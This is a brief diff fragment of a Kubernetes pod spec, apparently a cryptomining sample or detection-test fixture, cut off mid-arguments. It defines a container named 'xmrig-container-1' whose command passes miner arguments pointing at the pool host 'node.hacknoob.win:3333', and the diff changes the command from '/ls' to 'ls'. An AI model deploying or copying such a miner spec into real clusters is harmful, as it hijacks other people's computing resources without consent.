@@ -16,7 +16,7 @@ spec:
   - name: xmrig-container-1
     image: busybox
     command:
-    - /ls
+    - ls
     - -o
     - node.hacknoob.win:3333
     - -u
